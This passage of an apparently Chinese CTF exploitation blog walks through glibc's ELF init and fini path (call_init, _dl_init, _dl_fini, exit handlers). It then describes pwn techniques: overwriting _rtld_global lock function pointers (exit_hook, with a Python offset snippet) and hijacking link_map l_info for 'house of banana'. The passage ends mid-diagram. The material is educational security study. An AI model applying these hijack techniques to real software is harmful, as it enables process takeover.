class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Initialization for dynamic executables.  Find the main executable</span></span><br><span class="line"><span class="comment">   link map and run its init functions.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">call_init</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **env)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Obtain the main map of the executable.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DT_PREINIT_ARRAY is not processed here.  It is already handled in</span></span><br><span class="line"><span class="comment">     _dl_init in elf/dl-init.c.  Also see the call_init function in</span></span><br><span class="line"><span class="comment">     the same file.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_INIT] != <span class="literal">NULL</span>)</span><br><span class="line">    DL_CALL_DT_INIT(l, l-&gt;l_addr + l-&gt;l_info[DT_INIT]-&gt;d_un.d_ptr,</span><br><span class="line">    argc, argv, env);</span><br><span class="line"></span><br><span class="line">  ElfW(Dyn) *init_array = l-&gt;l_info[DT_INIT_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (init_array != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> jm</span><br><span class="line">= l-&gt;l_info[DT_INIT_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr));</span><br><span class="line">      ElfW(Addr) *addrs = (<span class="type">void</span> *) (init_array-&gt;d_un.d_ptr + l-&gt;l_addr);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> j = <span class="number">0</span>; j &lt; jm; ++j)</span><br><span class="line">((<span class="type">dl_init_t</span>) addrs[j]) (argc, argv, env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initialization for static executables.  There is no dynamic</span></span><br><span class="line"><span class="comment">   segment, so we access the symbols directly.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">call_init</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> ELF_INITFINI</span></span><br><span class="line">  _init ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里，对于动态链接程序先获取<code>link_map</code>，然后执行<code>.init</code>，再遍历 <code>.init_array</code> 函数数组，执行程序和共享库的所有构造函数。而对于动态链接器的构造函数则由另一个函数<code>_dl_init</code>再调用<code>call_init</code>执行，这个函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_init (<span class="keyword">struct</span> link_map *main_map, <span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **env)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Dyn) *preinit_array = main_map-&gt;l_info[DT_PREINIT_ARRAY];</span><br><span class="line">  ElfW(Dyn) *preinit_array_size = main_map-&gt;l_info[DT_PREINIT_ARRAYSZ];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GL(dl_initfirst) != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      call_init (GL(dl_initfirst), argc, argv, env);</span><br><span class="line">      GL(dl_initfirst) = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t do anything if there is no preinit array.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (preinit_array != <span class="literal">NULL</span>, <span class="number">0</span>)</span><br><span class="line">      &amp;&amp; preinit_array_size != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; (i = preinit_array_size-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr))) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *addrs;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> cnt;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling preinit: %s\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (main_map-&gt;l_name));</span><br><span class="line"></span><br><span class="line">      addrs = (ElfW(Addr) *) (preinit_array-&gt;d_un.d_ptr + main_map-&gt;l_addr);</span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; i; ++cnt)</span><br><span class="line">((<span class="type">dl_init_t</span>) addrs[cnt]) (argc, argv, env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Stupid users forced the ELF specification to be changed.  It now</span></span><br><span class="line"><span class="comment">     says that the dynamic loader is responsible for determining the</span></span><br><span class="line"><span class="comment">     order in which the constructors have to run.  The constructors</span></span><br><span class="line"><span class="comment">     for all dependencies of an object must run before the constructor</span></span><br><span class="line"><span class="comment">     for the object itself.  Circular dependencies are left unspecified.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     This is highly questionable since it puts the burden on the dynamic</span></span><br><span class="line"><span class="comment">     loader which has to find the dependencies at runtime instead of</span></span><br><span class="line"><span class="comment">     letting the user do it right.  Stupidity rules!  */</span></span><br><span class="line"></span><br><span class="line">  i = main_map-&gt;l_searchlist.r_nlist;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    call_init (main_map-&gt;l_initfini[i], argc, argv, env);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HAVE_INLINED_SYSCALLS</span></span><br><span class="line">  <span class="comment">/* Finished starting up.  */</span></span><br><span class="line">  _dl_starting_up = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_dl_init</code>又由谁调用呢？这里发现另一个<code>_start</code>(?)，位于<code>dl-start.S</code>（<strong>动态链接器</strong>的入口点），上文的<code>_start</code>位于<code>start.S</code>（<strong>程序</strong>的入口点）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/* Initial entry point code for the dynamic linker.</span><br><span class="line">   The function _dl_start is the real entry point;</span><br><span class="line">   it&#x27;s return value is the user program&#x27;s entry point.  */</span><br><span class="line">ENTRY (_start)</span><br><span class="line">/* Count arguments in r11 */</span><br><span class="line">l.orir3, r1, 0</span><br><span class="line">l.movhir11, 0</span><br><span class="line">1:</span><br><span class="line">l.addir3, r3, 4</span><br><span class="line">l.lwzr12, 0(r3)</span><br><span class="line">l.sfneir12, 0</span><br><span class="line">l.addir11, r11, 1</span><br><span class="line">l.bf1b</span><br><span class="line"> l.nop</span><br><span class="line">l.addir11, r11, -1</span><br><span class="line">/* store argument counter to stack.  */</span><br><span class="line">l.sw0(r1), r11</span><br><span class="line"></span><br><span class="line">/* Load the PIC register.  */</span><br><span class="line">l.jal0x8</span><br><span class="line"> l.movhi r16, gotpchi(_GLOBAL_OFFSET_TABLE_-4)</span><br><span class="line">l.orir16, r16, gotpclo(_GLOBAL_OFFSET_TABLE_+0)</span><br><span class="line">l.addr16, r16, r9</span><br><span class="line"></span><br><span class="line">l.orir3, r1, 0</span><br><span class="line"></span><br><span class="line">l.jal_dl_start</span><br><span class="line"> l.nop</span><br><span class="line">/* Save user entry in a call saved reg.  */</span><br><span class="line">l.orir22, r11, 0</span><br><span class="line">/* Fall through to _dl_start_user.  */</span><br><span class="line"></span><br><span class="line">_dl_start_user:</span><br><span class="line">/* Set up for _dl_init.  */</span><br><span class="line"></span><br><span class="line">/* Load _rtld_local (a.k.a _dl_loaded).  */</span><br><span class="line">l.lwzr12, got(_rtld_local)(r16)</span><br><span class="line">l.lwzr3, 0(r12)</span><br><span class="line"></span><br><span class="line">/* Load argc */</span><br><span class="line">l.lwzr18, got(_dl_argc)(r16)</span><br><span class="line">l.lwzr4, 0(r18)</span><br><span class="line"></span><br><span class="line">/* Load argv */</span><br><span class="line">l.lwzr20, got(_dl_argv)(r16)</span><br><span class="line">l.lwzr5, 0(r20)</span><br><span class="line"></span><br><span class="line">/* Load envp = &amp;argv[argc + 1].  */</span><br><span class="line">l.sllir6, r4, 2</span><br><span class="line">l.addir6, r6, 4</span><br><span class="line">l.addr6, r6, r5</span><br><span class="line"></span><br><span class="line">l.jalplt(_dl_init)</span><br><span class="line"> l.nop</span><br><span class="line"></span><br><span class="line">/* Now set up for user entry.</span><br><span class="line">   The already defined ABI loads argc and argv from the stack.</span><br><span class="line"></span><br><span class="line">   argc = 0(r1)</span><br><span class="line">   argv = r1 + 4</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/* Load SP as argv - 4.  */</span><br><span class="line">l.lwzr3, 0(r20)</span><br><span class="line">l.addir1, r3, -4</span><br><span class="line"></span><br><span class="line">/* Save argc.  */</span><br><span class="line">l.lwzr3, 0(r18)</span><br><span class="line">l.sw0(r1), r3</span><br><span class="line"></span><br><span class="line">/* Pass _dl_fini function address to _start.</span><br><span class="line">   Next start.S will then pass this as rtld_fini to __libc_start_main.  */</span><br><span class="line">l.lwzr3, got(_dl_fini)(r16)</span><br><span class="line"></span><br><span class="line">l.jrr22</span><br><span class="line"> l.nop</span><br><span class="line"></span><br><span class="line">END (_start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现正是这里调用了<code>_dl_start</code>和<code>_dl_init</code><br>如此完成初始化构造，可以看到<code>call_fini</code>（<strong>静态链接程序</strong>），<code>rtld_fini</code>（<strong>动态链接程序</strong>）也是在<code>__libc_start_main</code>完成注册的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Register the destructor of the statically-linked program.  */</span></span><br><span class="line">__cxa_atexit (call_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>在<code>__libc_start_main</code>的最后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_call_main (main, argc, argv MAIN_AUXVEC_PARAM);</span><br></pre></td></tr></table></figure><p>我们找到<code>__libc_start_call_main</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line">__libc_start_call_main (<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span><br><span class="line">                        <span class="type">int</span> argc, <span class="type">char</span> **argv MAIN_AUXVEC_DECL)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">exit</span> (main (argc, argv, __environ MAIN_AUXVEC_PARAM));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正是它最终调用<code>main</code>以及<code>exit</code>，同时这也解释了为什么<code>main</code>函数返回地址总是在<code>__libc_start_call_main</code>的一定偏移处。<br>现在我们再看被注册的<code>rtld_fini</code>，其实际调用<code>_dl_fini</code>函数，作用是调用进程空间中<strong>所有</strong>模块的析构函数，也就是遍历<code>.fini_array</code>，看其源码的这一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">    || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">        _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                          DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                          ns);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">            (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                          / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">        <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">            ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">    <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">        DL_CALL_DT_FINI</span><br><span class="line">            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里执行了<code>.fini</code>以及遍历了<code>.fini_array</code>。ok到这里elf程序从生到死就差不多到此为止，总结梳理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">内核执行 execve() 系统调用</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">加载 ELF 可执行文件</span><br><span class="line">    |</span><br><span class="line">    ├─ 动态链接程序：发现 .interp 段</span><br><span class="line">    |       |</span><br><span class="line">    |       V</span><br><span class="line">    |   内核加载动态链接器 ld.so</span><br><span class="line">    |       |</span><br><span class="line">    |       V</span><br><span class="line">    |   跳转到 ld.so 入口地址 -&gt; _dl_start (dl-start.S)</span><br><span class="line">    |           -&gt; _dl_init</span><br><span class="line">    |                 -&gt; call_init (执行 ld.so 自身的 .init_array)</span><br><span class="line">    |       |</span><br><span class="line">    |       V</span><br><span class="line">    |   ld.so 加载依赖库 (libc.so 等) 并重定位</span><br><span class="line">    |       |</span><br><span class="line">    |       V</span><br><span class="line">    |   跳转到程序入口 -&gt; _start (start.S)</span><br><span class="line">    |</span><br><span class="line">    └─ 静态链接程序：直接跳转到 _start (start.S)</span><br><span class="line">    </span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">_start</span><br><span class="line">    -&gt; __libc_start_main</span><br><span class="line">         -&gt; 注册析构函数：</span><br><span class="line">              - 静态链接：__cxa_atexit(call_fini)</span><br><span class="line">                    [程序自身析构器]</span><br><span class="line">              - 动态链接：__cxa_atexit(rtld_fini)</span><br><span class="line">                    [动态链接器统一收尾 -&gt; 调用 dl_fini]</span><br><span class="line">         -&gt; call_init (执行程序和 libc 的 .init_array)</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">__libc_start_call_main</span><br><span class="line">    -&gt; 调用 main()</span><br><span class="line">    -&gt; exit(main())</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">用户调用 exit(status)</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">__run_exit_handlers(status)</span><br><span class="line">    |</span><br><span class="line">    ├─ 调用 TLS 析构函数 (__call_tls_dtors)</span><br><span class="line">    |</span><br><span class="line">    ├─ 遍历 exit_function_list</span><br><span class="line">    |     |</span><br><span class="line">    |     ├─ ef_cxa:</span><br><span class="line">    |     |     - 静态程序：call_fini</span><br><span class="line">    |     |           [执行程序自身 .fini_array]</span><br><span class="line">    |     |     - 动态程序：rtld_fini</span><br><span class="line">    |     |           -&gt; _dl_fini</span><br><span class="line">    |     |                [按依赖顺序执行共享库 .fini_array/DT_FINI]</span><br><span class="line">    |     |                [清理动态链接器资源]</span><br><span class="line">    |     |</span><br><span class="line">    |     ├─ ef_at  → atexit 注册的函数</span><br><span class="line">    |     ├─ ef_on  → on_exit 注册的函数</span><br><span class="line">    |     └─ 其他类型忽略</span><br><span class="line">    |</span><br><span class="line">    ├─ 若执行期间有新回调注册 → 回到链表开头</span><br><span class="line">    |</span><br><span class="line">    ├─ 释放动态分配的回调节点</span><br><span class="line">    |</span><br><span class="line">    ├─ 若 run_list_atexit = true → 执行 __libc_atexit 钩子：默认为_IO_cleanup()</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">_exit(status)</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">内核：彻底终止进程</span><br></pre></td></tr></table></figure><h2 id="0x04-rtld-global"><a href="#0x04-rtld-global" class="headerlink" title="0x04 _rtld_global"></a>0x04 _rtld_global</h2><h3 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h3><p>攻击<code>_rtld_global.dl_rtld_lock_recursive</code>or<code>_rtld_global.dl_rtld_unlock_recursive</code>这两个函数指针，偏移分别为<code>0xf08</code>和<code>0xf10</code>，至于<code>_rtld_global</code>的地址需要泄露libc后自行调试确定，注意这个打法在<code>glibc2.34+</code>就失效了，因为这两个函数被写死了，不再是结构体中的钩子（<del>笔者调试的时候找了半天这两个钩子，突然想起来自己版本是glibc2.35</del>）例题参考whuctf2025迎新练习赛的It‘s my钩，不赘述，攻击示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ld_base = libc_base+<span class="number">0x213000</span> <span class="comment">#此偏移需要自行调试</span></span><br><span class="line">_rtld_global = ld_base + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">_dl_rtld_lock_recursive = _rtld_global + <span class="number">0xf08</span></span><br><span class="line">_dl_rtld_unlock_recursive = _rtld_global + <span class="number">0xf10</span> </span><br></pre></td></tr></table></figure><h3 id="l-info"><a href="#l-info" class="headerlink" title="l_info"></a>l_info</h3><p>劫持<code>l_info</code>，<strong>这里分析一下劫持原理（<del>走一下流水账</del>），至于检查绕过等攻击细节，在<code>house of banana</code>分析</strong><br>从前面分析我们不难发现，在执行<code>.init</code>，<code>.fini</code>，遍历<code>.init_array</code>和<code>.fini_array</code>的时候，就以<code>.fini_array</code>为例，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">            (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                          / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">        <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">            ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现使用<code>l-&gt;l_addr + l-&gt;l_info[xxx]</code>来索引各个结点，这个关系是什么样呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global (全局动态链接器状态)</span><br><span class="line">┌───────────────────────────────┐</span><br><span class="line">│ head -&gt; link_map 链表          │  &lt;─ 链表中每个节点对应一个库或可执行文件</span><br><span class="line">│ exit_done / lock / hook 等     │</span><br><span class="line">└───────────────────────────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">+--------------------------+</span><br><span class="line">| link_map (每个库/程序)     |</span><br><span class="line">|--------------------------|</span><br><span class="line">| l_addr   : 基址           |</span><br><span class="line">| l_name   : 库名           |</span><br><span class="line">| l_ld     : .dynamic 指针  |</span><br><span class="line">| l_info[] : 动态段 tag数组  |</span><br><span class="line">| ...                      |</span><br><span class="line">+--------------------------+</span><br><span class="line">           │</span><br><span class="line">   ┌───────┴─────────┐</span><br><span class="line">   ▼                 ▼</span><br><span class="line">l_info[DT_FINI]      l_info[DT_FINI_ARRAY] / l_info[DT_FINI_ARRAYSZ]  </span><br><span class="line">  |                      |</span><br><span class="line">  |                      